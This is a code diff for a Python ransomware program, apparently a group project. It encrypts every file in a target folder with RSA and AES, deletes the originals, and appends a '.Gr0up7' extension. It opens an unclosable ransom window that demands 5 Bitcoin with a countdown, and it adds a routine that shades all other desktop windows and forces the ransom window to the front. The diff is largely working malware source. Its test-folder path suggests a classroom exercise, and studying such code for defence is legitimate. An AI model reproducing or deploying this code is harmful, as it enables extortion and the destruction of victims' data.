@@ -10,9 +10,17 @@ from Crypto.Cipher import PKCS1_OAEP, AES
 import tkinter as tk
 from functools import partial
 from threading import Thread
+from ewmh import EWMH
+import subprocess
 
 ###########################################################################################################################
 #################################################     INITIALIZATIONS     #################################################
+###########################################################################################################################
+
+ENCRYPT_FOLDER_PATH = '/home/aleix/Desktop/TestFolder/'  # CHANGE THIS
+EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe']  # CHANGE THIS
+RANWOMWARE_WINDOW_NAME = 'Gr0up7 Ransomware'  # CHANGE THIS
+
 ###########################################################################################################################
 
 with open('./media/public.pem', 'rb') as f:
@@ -27,29 +35,31 @@ pubKey = base64.b64decode(pubKey)
 
 class GUI(Thread):
     def __init__(self):
-        # ↓↓ Initialize the Thread part of the GUI object, so we can use its functions and attributes
+        # Initialize the Thread part of the GUI object, so we can use its functions and attributes
         Thread.__init__(self)
-        # ↓↓ Kill the thread when the main thread finishes
+        # Kill the thread when the main thread finishes
         self.daemon = True
 
-    # ↓↓ Overwrite the run() method from thread. This code will be executed when using GUI.start()
+    # Overwrite the run() method from thread. This code will be executed when using GUI.start()
     def run(self):
         self.root = tk.Tk()
         def disable_event(): pass
         self.root.protocol("WM_DELETE_WINDOW", disable_event)
-        self.root.title('L0v3sh3 Ransomware')
+        self.root.title(RANWOMWARE_WINDOW_NAME)
         self.root.geometry('500x300')
         self.root.resizable(False, False)
         label1 = tk.Label(self.root, text='All your files have been encrypted! \n\n Please send us 5 Bitcoin to this address:\n\nmkHS9ne12qx9pS9VojpwU5xtRd4T7X7ZUt\n\n', font=('calibri', 12,'bold'))
         label1.pack()
         self.label = tk.Label(self.root,font=('calibri', 50,'bold'), fg='white', bg='blue')
         self.label.pack()
-        decrypt_button = tk.Button(self.root, text='Decrypt', command=decryption_traversal)
+        decrypt_button = tk.Button(self.root, text='Decrypt', command=self.decryption_traversal)
+        # decrypt_button = tk.Button(self.root, text='Decrypt', command=lambda: decryption_traversal(self.root))
         decrypt_button.pack()
 
         # call countdown first time
         self.countdown('23:59:59')
-        # root.after(0, countdown, 5)
+
+        # Thread(target=keep_active_window, daemon=True).start()
 
         self.root.mainloop()
 
@@ -75,6 +85,18 @@ class GUI(Thread):
                 minute = 59
                 second = 59
             self.root.after(1000, self.countdown, '{}:{}:{}'.format(hour, minute, second))
+
+    def decryption_traversal(self):
+        if not os.path.exists('./media/private.pem'): return
+
+        for item in scanRecurse(ENCRYPT_FOLDER_PATH):
+            filePath = Path(item)
+            fileType = filePath.suffix.lower()
+
+            if fileType in EXCLUDED_EXTENSIONS: continue
+            decrypt(str(filePath), './media/private.pem')
+
+        self.root.destroy()
 
 ###########################################################################################################################
 
@@ -107,12 +129,12 @@ def decrypt(dataFile, privateKeyFile):
     data = cipher.decrypt_and_verify(ciphertext, tag)
 
     # save the decrypted data to file
-    [ fileName, fileExtension ] = dataFile.split('.')
-    decryptedFile = fileName + '_decrypted.' + fileExtension
+    decryptedFile = dataFile.replace('.Gr0up7', '')
     with open(decryptedFile, 'wb') as f:
         f.write(data)
 
-    print('Decrypted file saved to ' + decryptedFile) 
+    print('Decrypted file saved to ' + decryptedFile)
+    os.remove(dataFile)
     
 def encrypt(dataFile, publicKey):
     '''
@@ -122,6 +144,7 @@ def encrypt(dataFile, publicKey):
     '''
     # read data from file
     extension = dataFile.suffix.lower()
+    print(extension)
     dataFile = str(dataFile)
     with open(dataFile, 'rb') as f:
         data = f.read()
@@ -142,9 +165,7 @@ def encrypt(dataFile, publicKey):
     ciphertext, tag = cipher.encrypt_and_digest(data)
 
     # save the encrypted data to file
-    fileName = dataFile.split(extension)[0]
-    fileExtension = '.L0v3sh3'
-    encryptedFile = fileName + fileExtension
+    encryptedFile = dataFile + '.Gr0up7'
     with open(encryptedFile, 'wb') as f:
         [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
     os.remove(dataFile)
@@ -157,34 +178,54 @@ def encryption_traversal():
         if fileType in EXCLUDED_EXTENSIONS: continue
         encrypt(filePath, pubKey)
 
-def decryption_traversal():
-    for item in scanRecurse(ENCRYPT_FOLDER_PATH):
-        filePath = Path(item)
-        fileType = filePath.suffix.lower()
+###########################################################################################################################
 
-        if fileType in EXCLUDED_EXTENSIONS: continue
-        decrypt(str(filePath), './media/private.pem')
+def keep_active_window():
+    while True:
+        ewmh = EWMH()
+
+        windows_list = ewmh.getClientList()
+
+        active_window_name = ewmh.getActiveWindow()
+
+        if type(active_window_name) != type(None) and active_window_name.get_wm_name() != RANWOMWARE_WINDOW_NAME:
+            # Go to the desktop minimizing all the windows one by one
+            for window in windows_list: 
+                ewmh.setWmState(window, 1, '_NET_WM_STATE_SHADED') 
+                ewmh.display.flush()
+
+        target_window = None
+        for window in windows_list:
+            if window.get_wm_name() == RANWOMWARE_WINDOW_NAME:
+                target_window = window
+                break
+
+        # Check if the target window was found
+        if target_window:
+            # Set the target window as the active window
+            ewmh.setActiveWindow(target_window)
+            ewmh.display.flush()
+
+        ewmh.display.close()
 
 ###########################################################################################################################
 
-ENCRYPT_FOLDER_PATH = '/home/aleix/Desktop/TestFolder/'  # CHANGE THIS
-EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe']  # CHANGE THIS
-
-###########################################################################################################################
+my_GUI = GUI()
 
 # Deploys the ransomware
 def encrypt_ransomware():
+    global my_GUI
+
     encryption_traversal()
 
-    my_GUI = GUI()
     my_GUI.start()
-    # root.mainloop()
 
     return
 
 # Deploys the ransomware
-def decrypt_ransomware(key = None):
-    decryption_traversal()
+def decrypt_ransomware():
+
+    my_GUI.decryption_traversal()
 
     return
 
@@ -202,6 +243,7 @@ def run():
 if __name__ == "__main__":
     from time import sleep
     encrypt_ransomware()
-
-    # for i in range(1000000): print(i)
     sleep(10)
+    decrypt_ransomware()
+    # Uncomment to check if Tkinter can run on a different thread without freezing
+    # for i in range(1000000): print(i)
